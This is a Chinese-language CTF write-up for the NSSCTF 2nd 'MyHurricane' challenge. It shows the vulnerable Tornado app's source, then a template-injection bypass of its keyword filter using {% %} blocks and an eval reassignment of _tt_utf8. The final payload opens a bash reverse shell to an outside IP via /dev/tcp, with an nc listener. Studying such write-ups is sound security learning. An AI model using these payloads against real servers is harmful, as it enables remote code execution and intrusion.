## 基本信息

- 题目名称：NSSCTF 2nd-MyHurricane
- 题目链接：https://www.nssctf.cn/problem/4283
- 考点清单：SSTI、Tornado
- 工具清单：Yakit
- payloads：Tornado SSTI

### 解题思路

题目给出代码：
```python
import tornado.ioloop
import tornado.web
import os


BASE_DIR = os.path.dirname(__file__)


def waf(data):
    bl = ['\'', '"', '__', '(', ')', 'or', 'and', 'not', '{{', '}}']
    for c in bl:
        if c in data:
            return False
    for chunk in data.split():
        for c in chunk:
            if not (31 < ord(c) < 128):
                return False
    return True


class IndexHandler(tornado.web.RequestHandler):
    def get(self):
        with open(__file__, 'r') as f:
            self.finish(f.read())

    def post(self):
        data = self.get_argument("ssti")
        if waf(data):
            with open('1.html', 'w') as f:
                f.write(f"""<html>
                        <head></head>
                        <body style="font-size: 30px;">{data}</body></html>
                        """)
                f.flush()
            self.render('1.html')
        else:
            self.finish('no no no')


if __name__ == "__main__":
    app = tornado.web.Application([
        (r"/", IndexHandler),
    ], compiled_template_cache=False)
    app.listen(827)
    tornado.ioloop.IOLoop.current().start()
```

很明显，这是一个tornado的SSTI题目。
源码直接告诉我们拦截关键词，省去了Fuzz探测的过程

### 过程和结果记录

在分析源码时，可以发现 `waf()` 函数对多种特殊字符和关键字进行了过滤，包括 `'`, `"`, `__`, `()`, `or`, `and`, `not`, `{{`, `}}` 等。此外，还对输入数据进行了字符范围检查，仅允许 ASCII 可见字符（31 < ord(c) < 128）。  

由于 `{{ }}` 被过滤，我们可以使用 `{% %}` 作为替代方案。Tornado 模板引擎支持 `{% %}` 作为代码块标识，能够绕过 WAF 对双大括号的检测。同时，利用 `_tt_utf8` 作为 `eval` 的别名，我们可以构造如下 payload 来执行任意代码：  

```
{%'print(flag)'%0a    _tt_utf8=eval%}
```

在这里，`%0a` 表示换行，紧接着的 `    `（四个空格）是为了满足 Tornado 模板中代码块的缩进要求。该 payload 实际上会将 `print(flag)` 赋值给 `_tt_tmp`，然后再执行 `eval(xhtml_escape(None))`。由于 `print()` 返回 `None`，因此 `eval()` 的参数为空，最终触发服务端报错。

为了解决这一问题，我们可以改用 `raw` 标签来包裹待执行代码，避免 `print` 返回值带来的问题。如下所示：

```
{% raw 'print(flag)'%0a    _tt_utf8=eval%}
```

接着，我们利用 `nc`（Netcat）开启监听：

```
nc -lvp 9999
```

由于 WAF 还对括号进行了过滤，进一步绕过时，我们利用 `request` 对象来构造 payload。`request` 对象可以获取到请求体中的参数，从而实现绕过：

```
ssti={% raw request.body_arguments[request.method][0]%0a    _tt_utf8=eval%}&POST=__import__('os').popen("bash -c 'bash -i >%26 /dev/tcp/107.XXX.XXX.XXX/9999 <%261'")
```

该 payload 中，`request.body_arguments` 读取了 POST 请求体中的 `__import__('os').popen()`，最终触发反弹 Shell。成功执行后，我们在 nc 中获得了 Shell 权限，并找到了 flag。  

![](images/NSSCTF%202nd-MyHurricane-nc.png)  

成功获取 flag 的结果如下：  

![](images/NSSCTF%202nd-MyHurricane-flag.png)  

### 总结
- 分析源码的能力很重要，我们可以直接得知 WAF 过滤的关键字，从而省去了 Fuzz 探测的步骤，提高了解题效率。
- 利用 `{% %}` 代替 `{{ }}`，并结合 `_tt_utf8` 变量，使 `eval` 执行我们的 payload，这个是一个巧妙的 SSTI 绕过方法，值得学习和掌握。